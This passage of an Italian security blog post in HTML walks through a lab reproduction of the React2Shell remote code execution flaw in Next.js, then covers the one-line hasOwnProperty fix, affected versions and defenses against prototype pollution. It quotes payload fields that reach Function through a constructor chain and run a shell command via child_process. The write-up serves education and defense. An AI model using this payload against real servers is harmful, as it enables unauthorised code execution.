+  <strong><code>"_prefix": "process.mainModule.require('child_process').execSync('id > /tmp/pwned');"</code></strong> — Il codice che vogliamo eseguire. Potrebbe essere qualsiasi cosa.
+</p>
+
+<p>
+  <strong><code>"get": "$1:constructor:constructor"</code></strong> — Risale la catena: il <code>constructor</code> di un oggetto e' <code>Object</code>, il <code>constructor</code> di <code>Object</code> e' <code>Function</code>. E <code>Function("codice")</code> crea una funzione da una stringa e la esegue. Game over.
+</p>
+
+<div class="insight-box fade-in">
+  <p><strong>La cosa assurda?</strong> Non serve che l'app abbia Server Actions. Basta che Next.js usi App Router. L'header <code>Next-Action</code> nel POST attiva il Flight decoder a prescindere. Un progetto scaffoldato con <code>create-next-app</code> che installa <code>next@16.0.6</code>, senza toccare una riga, e' gia' bucabile. Come comprare una macchina nuova e scoprire che la serratura si apre con una graffetta.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 06 — LA FIX                                          -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> La Fix</h2>
+<span class="section-number">Sezione 06. Una riga</span>
+
+<p>
+  Dopo tutto quello che abbiamo visto ti aspetti un refactoring epico, un team di 15 persone, tre mesi di lavoro. Invece il commit e' questo:
+</p>
+
+<div class="code-block fade-in" data-lang="diff">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln"></td><td class="code"><span class="cm">// facebook/react commit 7dc903c — 3 dicembre 2025</span></td></tr>
+<tr><td class="ln"></td><td class="code"><span class="cm">// packages/react-server-dom-*/src/client/ReactFlightClient.js</span></td></tr>
+<tr><td class="ln"></td><td class="code"></td></tr>
+<tr><td class="ln"></td><td class="code"> <span class="kw">function</span> <span class="fn">requireModule</span>(metadata) {</td></tr>
+<tr><td class="ln"></td><td class="code">   <span class="kw">var</span> moduleExports = __turbopack_require__(metadata[0]);</td></tr>
+<tr><td class="ln"></td><td class="code"><span style="color: #ff6b6b;">-  <span class="kw">return</span> moduleExports[metadata[NAME]];</span></td></tr>
+<tr><td class="ln"></td><td class="code"><span style="color: #00ff88;">+  <span class="kw">if</span> (hasOwnProperty.call(moduleExports, metadata[NAME])) {</span></td></tr>
+<tr><td class="ln"></td><td class="code"><span style="color: #00ff88;">+    <span class="kw">return</span> moduleExports[metadata[NAME]];</span></td></tr>
+<tr><td class="ln"></td><td class="code"><span style="color: #00ff88;">+  }</span></td></tr>
+<tr><td class="ln"></td><td class="code"><span style="color: #00ff88;">+  <span class="kw">return</span> undefined;</span></td></tr>
+<tr><td class="ln"></td><td class="code"> }</td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Un <code>if</code>. <code>hasOwnProperty.call()</code> controlla se la proprieta' appartiene direttamente all'oggetto, non alla catena dei prototipi. <code>__proto__</code> e <code>constructor</code> sono proprieta' ereditate, non proprie. Con quel check il decoder le ignora e tutta la catena di exploit si spezza al primo anello. L'equivalente di mettere il chiavistello alla porta. Uno. Un chiavistello.
+</p>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 07 — VERIFICA DELLA FIX                              -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Verifica della Fix</h2>
+<span class="section-number">Sezione 07. Aggiorniamo e riproviamo</span>
+
+<p>
+  Fermiamo il container, cambiamo la versione nel Dockerfile da 16.0.6 a 16.0.7, ribuildiamo:
+</p>
+
+<div class="code-block fade-in" data-lang="bash">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code">docker compose down</td></tr>
+<tr><td class="ln">2</td><td class="code">sed -i '' 's/16.0.6/16.0.7/' Dockerfile</td></tr>
+<tr><td class="ln">3</td><td class="code">docker compose up --build -d</td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Aspettiamo che parta e riproviamo tutto:
+</p>
+
+<div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">python3 check_vuln.py</span>
+<span class="t-ok">[OK] Non vulnerabile  http://localhost:3000</span>
+</div>
+
+<div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">docker exec react2shell-lab cat /tmp/pwned</span>
+<span class="t-ok">cat: /tmp/pwned: No such file or directory</span>
+</div>
+
+<p>
+  Niente timeout, niente file, niente <code>uid=0(root)</code>. Il server risponde normalmente e il payload non viene eseguito. Un numero di versione di differenza. Ho chiamato la iena per farle vedere. "Vedi? Prima era bucato, adesso no." "Ok." E se n'e' andata. 26 anni di matrimonio in una parola.
+</p>
+
+<!-- SCREENSHOT 5: versione patchata, fix verificata -->
+<img src="../immagini/react2shell/screen_5.png" alt="Terminale: Next.js 16.0.7 patchato, check_vuln mostra Non vulnerabile, /tmp/pwned non esiste" class="lab-screenshot fade-in">
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 08 — VERSIONI                                        -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Versioni Colpite e Patchate</h2>
+<span class="section-number">Sezione 08. Controlla la tua app</span>
+
+<table class="strategy-table fade-in">
+  <thead>
+    <tr>
+      <th>Pacchetto</th>
+      <th>Vulnerabile</th>
+      <th>Patchato</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>react-server-dom-webpack</td>
+      <td><span class="verdict-fail">19.0, 19.1.0, 19.1.1, 19.2.0</span></td>
+      <td><span class="verdict-ok">19.0.1, 19.1.2, 19.2.1</span></td>
+    </tr>
+    <tr>
+      <td>react-server-dom-turbopack</td>
+      <td><span class="verdict-fail">19.0, 19.1.0, 19.1.1, 19.2.0</span></td>
+      <td><span class="verdict-ok">19.0.1, 19.1.2, 19.2.1</span></td>
+    </tr>
+    <tr>
+      <td>Next.js</td>
+      <td><span class="verdict-fail">15.0 — 16.0.6</span></td>
+      <td><span class="verdict-ok">15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7</span></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>
+  <strong>Chi sta tranquillo</strong>: Next.js 13.x, 14.x stable, chi usa ancora Pages Router (la vecchia cartella <code>pages/</code>), Edge Runtime, SPA classiche senza server components (Vite, CRA).
+</p>
+
+<div class="code-block fade-in" data-lang="bash">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cm"># Controlla la tua versione</span></td></tr>
+<tr><td class="ln">2</td><td class="code">npx next --version</td></tr>
+</tbody></table></div>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 09 — LEZIONI                                         -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Cosa Porto a Casa</h2>
+<span class="section-number">Sezione 09. Le difese</span>
+
+<p>
+  Un server e' caduto per un <code>obj[userInput]</code> senza validazione. Succede piu' spesso di quanto pensi. Ecco le difese, dalla piu' semplice alla piu' aggressiva:
+</p>
+
+<table class="strategy-table fade-in">
+  <thead>
+    <tr>
+      <th>Difesa</th>
+      <th>Cosa fa</th>
+      <th>Quando</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>hasOwnProperty</code></td>
+      <td>Controlla che la proprieta' sia dell'oggetto, non del prototipo</td>
+      <td>Ogni <code>obj[chiave]</code> con chiave esterna</td>
+    </tr>
+    <tr>
+      <td><code>Object.create(null)</code></td>
+      <td>Oggetto senza prototipo. Niente <code>__proto__</code>, niente catena</td>
+      <td>Dizionari, lookup table, cache</td>
+    </tr>
+    <tr>
+      <td><code>Map</code></td>
+      <td>Struttura nativa chiave/valore, immune a pollution</td>
+      <td>Alternativa moderna ai dizionari</td>
+    </tr>
+    <tr>
+      <td>Allowlist</td>
+      <td>Lista esplicita delle chiavi ammesse, il resto si scarta</td>
+      <td>API, config, parametri utente</td>
+    </tr>
+    <tr>
+      <td><code>Object.freeze(Object.prototype)</code></td>
+      <td>Rende il prototipo immutabile. Nessuno ci scrive</td>
+      <td>Hardening estremo (puo' rompere librerie)</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="insight-box fade-in">
+  <p><strong>La regola e' una sola.</strong> Se una chiave arriva dall'esterno e finisce tra parentesi quadre, hai un potenziale prototype pollution. Non importa se il framework e' React, Express, Fastify, o uno script che hai scritto alle 3 di notte. Il pattern e' sempre quello: <code>obj[roba_che_non_controlli]</code>.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 10 — CONCLUSIONE                                     -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Conclusione</h2>
+<span class="section-number">Sezione 10. Chiudiamo</span>
+
+<p>
+  Siamo partiti con un container Docker e siamo finiti con un <code>uid=0(root)</code> su un server Next.js bucato con un curl. Poi l'abbiamo fixato cambiando una riga. Una. La distanza tra "sei dentro" e "non passi" e' un <code>hasOwnProperty</code>.
+</p>
+
+<p>
+  Le vulnerabilita' non sono magia nera. Sono bug. Bug che si capiscono, si riproducono, si fixano. Il casino e' quando nessuno li cerca, nessuno aggiorna, e tutti pensano "tanto lo usano tutti, sara' sicuro". Lo usavano tutti anche quando era bucato.
+</p>
+
+<p>
+  Se hai un'app Next.js con App Router, controlla la versione. Se e' tra quelle vulnerabili, aggiorna. Un <code>npm update</code> e un rebuild.
+</p>
+
+<div class="conclusion-box fade-in">
+  <p class="quote">La distanza tra "il server e' tuo" e "il server e' sicuro" e' un hasOwnProperty.</p>
+  <p style="color: var(--text-secondary); margin-top: 1rem; font-size: 0.85rem;">
+    CVE-2025-55182 / CVE-2025-66478. Dicembre 2025. CVSS 10.0.<br>
+    Fix: una riga. Impatto: mezzo web.
+  </p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- FONTI                                                     -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Fonti</h2>
+<span class="section-number">Riferimenti e approfondimenti</span>
+
+<ul style="font-size: 0.9rem; line-height: 2;">
+  <li><a href="https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/" target="_blank" rel="noopener" style="color: var(--accent-highlight);">Datadog Security Labs: React2Shell RCE</a></li>
+  <li><a href="https://www.akamai.com/blog/security-research/cve-2025-55182-react-nextjs-server-functions-deserialization-rce" target="_blank" rel="noopener" style="color: var(--accent-highlight);">Akamai: React/Next.js Deserialization RCE</a></li>
+  <li><a href="https://www.praetorian.com/blog/critical-advisory-remote-code-execution-in-next-js-cve-2025-66478-with-working-exploit/" target="_blank" rel="noopener" style="color: var(--accent-highlight);">Praetorian: Next.js RCE con exploit funzionante</a></li>
+  <li><a href="https://www.picussecurity.com/resource/blog/react-flight-protocol-rce-vulnerability-cve-2025-55182-and-cve-2025-66478-explained" target="_blank" rel="noopener" style="color: var(--accent-highlight);">Picus Security: Flight Protocol RCE spiegata</a></li>
+</ul>
+
+
+</article>
+
+<!-- ======================== FOOTER ======================== -->
+<footer class="footer">
+  <p>Signal Pirate | <a href="https://github.com/pinperepette" target="_blank" rel="noopener">Andrea Amani</a> aka The Pirate</p>
+  <p style="margin-top: 0.5rem; opacity: 0.5;">Laboratorio di un pirata</p>
+</footer>
+
+<script src="../js/main.js"></script>
+</body>
+</html>
